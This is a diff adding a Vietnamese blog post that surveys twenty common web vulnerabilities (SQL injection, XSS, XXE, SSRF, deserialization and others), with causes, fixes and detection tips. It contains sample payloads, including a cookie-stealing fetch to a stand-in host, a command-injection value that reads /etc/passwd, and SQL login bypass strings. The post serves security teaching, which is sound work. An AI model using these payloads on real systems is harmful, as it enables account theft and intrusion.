@@ -1,0 +1,407 @@
+---  
+title: "Top 20 web vulnerabilities everyone knows"  
+date: 2026-04-17 +0700  
+categories: [Pentest, WebPentest]  
+tags: [web, pentest, testing, OSINT]
+image:
+  path: https://hackmd.io/_uploads/HJIX_V1pZx.jpg
+  alt: "Top 20 lỗ hổng web mà ai cũng biết"
+---
+### Top 20 lỗ hổng web ai cũng biết
+Đây sẽ là tổng hợp của mình về 20 lỗ hổng web mà chắc ai cũng biết rôi, nhưng vẫn rất phổ biến 🙄
+## 1. Injection
+### Nguyên nhân
+**Injection** là lỗ hổng xảy ra do sự thiếu sót trong việc lọc các dữ liệu đầu vào không đáng tin cậy. Khi bạn truyền các dữ liệu chưa được lọc tới Database (Ví dụ như lỗ hổng SQL injection), tới trình duyệt (lỗ hổng XSS), tới máy chủ LDAP (lỗ hổng LDAP Injection) hoặc tới bất cứ vị trí nào khác. Vấn đề là kẻ tấn công có thể chèn các đoạn mã độc để gây ra lộ lọt dữ liệu và chiếm quyền kiểm soát trình duyệt của khách hàng.
+
+### Cơ chế hoạt động của lỗ hổng
+Một vài loại lỗ hổng phổ biến:
+#### 1. SQL injection
+Chèn thêm các câu lệnh SQL vào truy vấn SQL, hacker có thể chiếm tài khoản hoặc truy các thông tin của **database** mà không được phép.
+
+Ví dụ
+**1. Login function**
+Nếu ứng dụng có DB mySQL mà có chức năng đăng 
+nhập như sau
+
+`SELECT username, password FROM users WHERE username = 'Kien'  AND password = 'Kienpwn'`
+
+Vậy hacker có thể thay vì ghi user là `Kien` thì thay bằng `Kien' OR 2=2 -- ` 
+vậy câu query hiện giờ sẽ là
+`SELECT username, password FROM users WHERE username = 'Kien' OR 2=2 -- ' AND password = ''`
+
+Vậy là câu truy vấn sẽ trở nên hợp lệ và trả về đúng kết quả mong muốn mà không cần mật khẩu, và hacker có quyền đăng nhập vào hệ thống.
+
+**2. Query function**
+Nếu ứng dụng có chức năng truy vấn như tìm sản phẩm như sau
+`SELECT name, price, description, amount FROM products WHERE name = 'popcorn'`
+
+Nhưng khi ta nhập vào là `' OR 5=5 --` thì câu query sẽ thành `SELECT name, price, description, amount FROM products WHERE name = 'popcorn' OR 5=5 -- '`
+Và trả về danh sách toàn bộ sản phẩm. Hacker có thể kết hơp nhiều kĩ thuật như `UNION based`, .. để truy cập nhiều thông tin nhạy cảm của databse.
+
+Ngoài ra nhiều ứng dụng sẽ không hiển thị kết quả truy vấn trực tiếp, hacker sẽ sử dụng các kĩ thuật `blind SQL injection` như `Time based` (dựa vào thời gian phản hồi), `Error based` (dựa vào thông báo lỗi),..
+
+#### 2. XSS
+<span style="color: skyblue">Sript site scripting </span> hay <span style="color: skyblue">XSS</span> là cách chèn các đoạn mã **client-side** như <span style="color: orange"> **javascript**</span> để chạy các lệnh ở trình duyệt mà hacker mong muốn.
+Ví dụ:
+Ứng dụng web hiển thị tên người dùng dưới dạng 
+```
+<p>huyanh</p>
+```
+Vậy hacker sẽ inject thẻ `<script>` vào thay vì tên `huyanh` để chạy script
+```
+<p>
+huyanh
+<script>fetch("https://hacker.viruss/?l=" + document.cookie)
+</script>
+</p>
+```
+<script>alert(1) sao ko chay dc nhi hackmd filter a =))</script>
+#### 5. OS Command Injection
+Chèn lệnh hệ thống để thực thi.
+ví dụ app dùng lệnh `system("ls " . $_GET['dir'])` để chạy lệnh hệ thống và lấy thông tin các tệp tin trong thư mục, vậy hacker có thể đễ dàng gửi vào param dir `. ; cat /etc/passwd` để câu lệnh trở thành `ls . ; cat /etc/passwd`
+### Hậu quả
+Injection có thể dẫn đến mất dữ liệu, sự gián đoạn hoặc tiết lộ cho những tổ chức thứ 3, mất hết tài khoản, hoặc từ chối truy cập. Đôi khi, injection dẫn tới việc chiếm quyền kiểm soát.
+
+### Cách phòng chống
+*    Nguyên tắc cơ bản để chống lại Injection là phải tách dữ liệu được gửi và sàng lọc khỏi câu lệnh thực thi trực tiếp và các câu query, truy vấn
+
+*    Có cơ chế kiểm tra và lọc dữ liệu đầu vào như giới hạn kích thước, loại bỏ các kí tự đặc biệt, ..
+*    Sử dụng thủ tục lưu trữ (Store procedures) trong CSDL. Tạm hiểu là đưa các câu truy vấn SQL vào trong thủ tục (gần giống hàm trong các ngôn ngữ lập trình), dữ liệu được truyền vào thủ tục thông qua các tham số -> tách dữ liệu khỏi mã lệnh
+*    Không hiển thị Exception hay thông báo lỗi để tránh kẻ tấn công có thể suy đoán kết quả
+*    Thiết lập quyền sử dụng cho người dùng phù hợp
+*    Chủ động sử dụng các công cụ dò quét lỗ hổng bảo mật
+*    Backup dữ liệu thường xuyên
+
+### Cách phát hiện 
+Với tuỳ các loại Injection có nhiều cách phát hiện khác nhau
+như SQL Injection thử bằng cách payload đơn giản(vd: thử bằng các dấu như `'` hay `"` có lỗi hay không,..) hoặc dùng các tool tự dộng như `sqlmap`, .. Tương tự như thế với Command Injection, XSS,.. sẽ thử bằng các payload phù hợp.
+
+
+## 2. Broken Authentication (Lỗi xác thực)
+### Nguyên nhân: 
+Quản lý phiên làm việc (Session) hoặc định danh người dùng yếu kém.
+
+### Cơ chế hoạt động: 
+Kẻ tấn công bẻ khóa mật khẩu (Brute-force), dự đoán Session ID, hoặc khai thác tính năng "Quên mật khẩu" thiếu an toàn,...
+
+### Rủi ro: 
+Chiếm đoạt tài khoản người dùng hoặc người quản trị.
+
+### Khắc phục:
+
+*    Triển khai MFA (Multi-Factor Authentication).
+
+*    Thiết lập chính sách mật khẩu mạnh và cơ chế khóa tài khoản khi nhập sai nhiều lần.
+
+*    Sử dụng trình quản lý Session an toàn (HttpOnly, Secure flag).
+
+### Phát hiện:
+Kiểm tra độ dài/độ phức tạp của Session ID, xem có theo quy tắc, thứ tự nào, có đoán được không; thử tấn công Brute-force xem có giới hạn lần đăng nhập(rate limit) hay không.
+
+### 3. Sensitive Data Exposure (Cryptographic Failures)
+Nguyên nhân: Không mã hóa hoặc mã hóa yếu các dữ liệu quan trọng.
+
+### Cơ chế: 
+Dữ liệu nhạy cảm (PII, thẻ tín dụng) bị truyền đi qua HTTP hoặc lưu trữ bằng thuật toán băm (hash) yếu như MD5, SHA1 dẫn đến có thể bị hacker crack và lấy thông tin.
+
+### Rủi ro: 
+Rò rỉ thông tin cá nhân, vi phạm pháp luật ([GDPR](https://mst.gov.vn/bao-ve-du-lieu-theo-quy-trinh-gdpr-197143786.htm), [PCI-DSS](https://en.wikipedia.org/wiki/Payment_Card_Industry_Data_Security_Standard)).
+
+### Khắc phục:
+
+Sử dụng TLS 1.2+ cho mọi kết nối.
+
+Mã hóa dữ liệu tại chỗ (At-rest) bằng AES-256.
+
+Lưu mật khẩu bằng Argon2 hoặc Bcrypt.
+
+Phát hiện: Sử dụng Wireshark/Burp Suite để xem dữ liệu truyền đi xem loại thuật toán dùng để mã hoá; kiểm tra cấu hình SSL/TLS (ssllabs.com).
+
+## 4. XML External Entity (XXE)
+Nguyên nhân: Trình phân tích cú pháp XML (XML Parser) hỗ trợ các thực thể bên ngoài (External Entities).
+
+### Cơ chế: 
+Kẻ tấn công gửi một file XML chứa định nghĩa thực thể trỏ đến file trên hệ thống hoặc một URL nội bộ.
+
+### Phân loại: 
+*    In-band (trả về nội dung file)
+*    Out-of-band (OOB-XXE).
+
+
+### Rủi ro: 
+Đọc file hệ thống (/etc/passwd), SSRF, DoS (Billion Laughs attack).
+
+### Khắc phục: 
+Vô hiệu hóa DTD (Document Type Definitions) và External Entities trong thư viện XML của ngôn ngữ.
+
+### Phát hiện: 
+Chèn payload gọi đến máy chủ của chính ta (vd . http://attacker.com/test.txt) và xem logs.
+
+## 5. Broken Access Control (Lỗi kiểm soát truy cập)
+### Nguyên nhân: Không thực hiện kiểm tra quyền hạn ở phía Server (Server-side).
+
+### Cơ chế:
+
+*    IDOR: Thay đổi tham số id=123 thành id=124 để xem profile người khác.
+
+*    Vertical Escalation: User bình thường truy cập vào đường dẫn /admin.
+
+### Rủi ro: 
+Xem, thao tác dữ liệu trái phép, chiếm quyền quản trị.
+
+### Khắc phục: Áp dụng mô hình RBAC (Role-Based Access Control) và kiểm tra quyền cho mọi request.
+
+### Phát hiện: 
+Dùng 2 tài khoản, tráo đổi Cookie, thử đổi các tham số như id tăng giảm, tìm các trang bị ẩn, .. và thực hiện các hành động chéo.
+
+## 6. Security Misconfiguration (Cấu hình sai)
+### Nguyên nhân: 
+Để cấu hình mặc định, bật các tính năng không cần thiết.
+
+### Cơ chế: 
+Để lộ trang Admin, bật chế độ Debug hiển thị Stack Trace, file .git hoặc .env công khai.
+
+### Rủi ro: 
+Cung cấp thông tin nhạy cảm, nguy hiểm cho kẻ tấn công thực hiện các bước tiếp theo.
+
+### Khắc phục: 
+Quy trình Hardening hệ thống đầy đủ, đúng cách, xóa file thừa, tắt Directory Listing.
+
+### Phát hiện: 
+Sử dụng các công cụ quét port (Nmap), quét thư mục, file trên web (ffuf, gobuster,..).
+
+## 7. Cross-Site Scripting (XSS)
+### Nguyên nhân: 
+Dữ liệu người dùng được hiển thị trên trang web mà không qua bộ lọc.
+
+### Cơ chế: Chèn mã client-side (JavaScript) vào trang web để thực thi trên trình duyệt nạn nhân.
+
+### Phân loại:
+*    Stored: Lưu vào DB.
+*    Reflected: Nằm trong URL.
+*    DOM-based: Lỗi ở logic JS phía Client.
+
+### Rủi ro: 
+Đánh cắp Cookie, chuyển hướng, lừa người dùng, thay đổi nội dung trang (Deface).
+
+### Khắc phục:
+
+*    Output Encoding (Mã hóa đầu ra).
+*    Sử dụng Content Security Policy (CSP).
+
+### Phát hiện: 
+Sử dụng một vài Payload như:     
+```
+<script>alert(1)</script>, <img src=x onerror=alert(1)>.
+```
+
+## 8. Using Components with Known Vulnerabilities
+### Nguyên nhân: 
+Sử dụng thư viện, framework (NodeJS, Java Spring, WordPress) lỗi thời.
+
+### Cơ chế: 
+Khai thác các CVE đã công bố (như Log4Shell).
+
+### Rủi ro: 
+Tùy thuộc vào lỗ hổng của thư viện đó, thường là RCE.
+
+### Khắc phục: 
+Thường xuyên cập nhật (Update) và sử dụng các công cụ quét phụ thuộc (Snyk, OWASP Dependency-Check).
+
+### Phát hiện: 
+Kiểm tra version thư viện,( có thể trong package.json hoặc pom.xml).
+
+## 9. Insufficient Logging and Monitoring
+### Nguyên nhân: 
+Không ghi nhật ký hoặc không theo dõi các hoạt động bất thường.
+
+### Cơ chế: 
+Kẻ tấn công thực hiện tấn công trong thời gian dài mà không bị phát hiện.
+
+### Rủi ro: 
+Không thể ứng phó kịp thời hoặc không có dữ liệu điều tra sau sự cố.
+
+### Khắc phục: 
+Ghi log các sự kiện quan trọng (Login, Fail, Change permission) và đẩy về hệ thống tập trung (SIEM).
+
+### Phát hiện: 
+Thử các hành động tấn công và kiểm tra xem Admin có nhận được cảnh báo không.
+
+## 10. CSRF (Cross-Site Request Forgery)
+### Nguyên nhân: 
+Trình duyệt tự động gửi Cookie của website mục tiêu khi người dùng nhấn vào một link lạ.
+
+### Cơ chế: 
+Ép người dùng thực hiện hành động (đổi pass, chuyển tiền) mà họ không biết bằng cách lợi dụng cơ chế bảo mật yếu trình tự duyệt đính kèm cookie.
+
+### Rủi ro: 
+Thực hiện chức năng, thay đổi cấu hình tài khoản trái phép.
+
+### Khắc phục: 
+Sử dụng Anti-CSRF Token hoặc setup thuộc tính Cookie SameSite=Lax/Strict.
+
+### Phát hiện: 
+Tạo một file HTML giả lập request (PoC) và chạy trên trình duyệt đã login.
+
+## 11. Open Redirect
+### Nguyên nhân: 
+Tham số URL điều hướng người dùng mà không kiểm tra domain đích.
+
+### Cơ chế: 
+example.com/login?redirect=http://malicious.com.
+
+### Rủi ro: 
+Phishing (lừa đảo người dùng cung cấp mật khẩu).
+
+### Khắc phục: 
+Sử dụng danh sách trắng (Allowlist) cho các domain được phép redirect.
+
+### Phát hiện: 
+Thay đổi giá trị tham số redirect thành một domain bên ngoài.
+
+## 12. Server-Side Request Forgery (SSRF)
+### Nguyên nhân: 
+Server thực hiện request tới URL do user cung cấp.
+
+### Cơ chế: 
+Kẻ tấn công buộc server truy cập vào các tài nguyên nội bộ mà bên ngoài không thấy được.
+
+### Rủi ro: 
+Quét mạng nội bộ, truy cập Cloud Metadata (AWS 169.254.169.254), truy cập vào các dịch vụ chạy nội bộ.
+
+### Khắc phục: 
+Chặn request tới IP nội bộ, sử dụng Allowlist domain.
+
+### Phát hiện: 
+Cung cấp URL trỏ về localhost hay ip 127.0.0.1.
+
+## 13. Server-Side Template Injection (SSTI)
+### Nguyên nhân: 
+Chèn input người dùng vào Template Engine (Jinja2, Twig, Freemarker).
+
+### Cơ chế: 
+Thực thi các biểu thức của template để gọi hàm hệ thống.
+
+### Rủi ro: 
+có thể RCE(Remote Code Execution) chiếm quyền hệ thống.
+
+### Khắc phục: 
+Không bao giờ nối chuỗi vào template, sử dụng tham số hóa.
+
+### Phát hiện: 
+Sử dụng cách Payload để phát hiện vd: {{7*7}} hoặc ${7*7},...
+
+## 14. Path Traversal (Directory Traversal)
+### Nguyên nhân: 
+Thiếu bộ lọc các ký tự điều hướng thư mục.
+
+### Cơ chế: 
+Sử dụng ../ để truy cập file ngoài thư mục web (ví dụ: image?name=../../etc/passwd).
+
+### Rủi ro: 
+Lộ file trong hệ thống nhạy cảm.
+
+### Khắc phục: 
+Sử dụng hàm basename() hoặc chặn chuỗi ../.
+
+### Phát hiện: 
+thử tên file với các payload: `../../`, ..
+
+## 15. File Inclusion (LFI/RFI)
+### Nguyên nhân: 
+Sử dụng đầu vào của người dùng trong các hàm nạp file (vd trong php: include, require).
+
+### Cơ chế:
+
+LFI: Lợi dụng hàm nạp file để đọc file nội bộ.
+
+RFI: Nạp file để chạy lệnh từ server kẻ tấn công.
+
+### Rủi ro: 
+bị lộ cách file nhạy cảm của hệ thống, bị chiếm quyền điều khiển toàn bộ.
+
+### Khắc phục: 
+Tắt allow_url_include (trong PHP), sử dụng Hardcoded mapping. Sử dụng các hàm như real_path để kiểm tra đường dẫn được phép hay không.
+
+### Phát hiện: 
+Thử nạp URL từ xa hoặc file hệ thống.
+
+## 16. Insecure/Unrestricted File Upload
+### Nguyên nhân: 
+Không kiểm tra kỹ nội dung và loại file tải lên.
+
+### Cơ chế: 
+Tải lên file .php, .jsp, .aspx chứa mã độc (Webshell).
+
+### Rủi ro: 
+Chiếm quyền điều khiển server.
+
+### Khắc phục: 
+Kiểm tra Magic Bytes, đổi tên file sau khi upload, lưu file ở thư mục không có quyền thực thi.
+
+### Phát hiện: 
+Thử upload file script với nhiều extension khác nhau (.php5, .phtml).
+
+## 17. Clickjacking (UI Redressing)
+### Nguyên nhân: 
+Trang web cho phép được nhúng vào `<iframe>`.
+
+### Cơ chế: 
+Chồng một lớp iframe trong suốt lên trên một trang web độc hại để lừa người dùng click vào nút ẩn.
+
+### Rủi ro: 
+Thực hiện các hành động không mong muốn (Like, Delete, Buy).
+
+### Khắc phục: 
+Header X-Frame-Options: DENY hoặc CSP frame-ancestors 'none'.
+
+### Phát hiện: 
+Tạo trang HTML nhúng web mục tiêu vào iframe.
+
+## 18. CORS Misconfiguration (Lỗi cấu hình CORS)
+### Nguyên nhân: 
+Cấu hình Access-Control-Allow-Origin quá lỏng lẻo.
+
+### Cơ chế: 
+Cho phép mọi domain (*) hoặc domain của kẻ tấn công đọc dữ liệu nhạy cảm của người dùng qua AJAX.
+
+### Rủi ro: 
+Đánh cắp dữ liệu người dùng (Private Data) từ trình duyệt.
+
+### Khắc phục: 
+Cấu hình cụ thể domain được phép, không dùng wildcard *.
+
+### Phát hiện: 
+Gửi request với Header Origin: http://attacker.com và xem phản hồi.
+
+## 19. Host Header Attack
+### Nguyên nhân: 
+Ứng dụng sử dụng giá trị của Header Host để tạo URL tuyệt đối.
+
+### Cơ chế: 
+Thay đổi Header Host để làm sai lệch các chức năng của ứng dụng
+
+### Rủi ro: 
+Password Reset Poisoning, Web Cache Poisoning.
+
+### Khắc phục: 
+Validate Header Host so với server config.
+
+### Phát hiện: 
+Thay đổi Header Host trong Burp Suite và kiểm tra các link trong phản hồi.
+
+## 20. Insecure Deserialization (Giải tuần tự hóa không an toàn)
+### Nguyên nhân:
+Tin tưởng dữ liệu serialized từ phía người dùng.
+
+### Cơ chế: 
+Kẻ tấn công tạo một object chứa mã độc, khi server giải mã (deserialize) sẽ kích hoạt mã này.
+
+### Rủi ro: 
+chiếm quyền toàn bộ hệt thống.
+
+### Khắc phục: 
+Không dùng định dạng nhị phân của ngôn ngữ (Java, PHP, Python pickle) cho dữ liệu từ client. Dùng JSON/XML thuần.
+
+### Phát hiện: 
+Tìm các chuỗi đặc thù (rO0AB... cho Java, O:4:"User"... cho PHP),...
